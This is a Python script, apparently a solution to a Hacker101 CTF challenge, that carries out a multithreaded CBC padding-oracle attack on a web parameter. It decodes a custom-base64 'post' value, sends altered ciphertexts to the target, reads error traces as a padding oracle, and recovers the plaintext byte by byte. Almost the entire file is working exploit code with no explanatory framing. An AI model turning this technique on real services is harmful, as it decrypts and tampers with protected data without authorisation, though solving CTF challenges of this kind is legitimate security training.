from base64 import *
from pwn import *
from tqdm import trange
import requests as req
import threading

url='https://acb80a8ff85b986ff2b3c223f5142c1f.ctf.hacker101.com?post='

def custom_decode(x):
    x=x.replace(b'~', b'=').replace(b'!', b'/').replace(b'-', b'+')
    return b64decode(x)

def custom_encode(x):
    x=b64encode(x)
    return x.replace(b'=', b'~').replace(b'/', b'!').replace(b'+', b'-')

proxies = {
    "http": "http://127.0.0.1:7890",
    "https": "http://127.0.0.1:7890",
}

def oracle(x):
    target = url + custom_encode(x).decode()

    web = req.get(
        target,
        proxies=proxies,
        timeout=10
    )

    #print(web.status_code)
    #print(web.url)
    #print(web.text[:300])

    return 'File "./common.py"' not in web.text

cur_param=b'YfS6LEzcsI93e-nDqtogUhXWVlPe4E7MNYMqSXE0NJyBCa9wLgD010KMTJ1EmUIcHj5d-qpiu6yYX6DkEEbk-78ZU9sDY9AiM5yQH9rrFCXxys7xJKzgq4xBrRtIOokDJ1Y2l3FFxlCe0j88310e1bG340y168-HaLub1h56LJYZS7UzGUbebvl22aQfThUD3cycXsAfNptFWsJ3!j!SRQ~~'

cur_param=custom_decode(cur_param)

ans=b''
cur=b''

def find_byte_range(iv, mess, cur, now, start, end, result):
    for k in range(start, end):
        if oracle(iv[:now] + bytes([k]) + xor(cur, iv[now+1:], chr(16-now).encode()*(15-now)) + mess):
            result.append(k)
            break

for i in trange(0, len(cur_param)-16, 16):
    iv, mess = cur_param[i:i+16], cur_param[i+16:i+32]
    for j in trange(16):
        now = 15 - j
        threads = []
        result = []
        step = 256 // 32
        for t in range(32):
            start = t * step
            end = (t + 1) * step if t != 31 else 256
            thread = threading.Thread(target=find_byte_range, args=(iv, mess, cur, now, start, end, result))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()
        
        if result:
            k = result[0]
            if now == 15:
                if k != iv[15]:
                    cur = xor(k, iv[15], 1) + cur
            else:
                cur = xor(k, iv[now], (16-now)) + cur
#            print(cur)

    ans += cur
    print(ans)
    cur = b''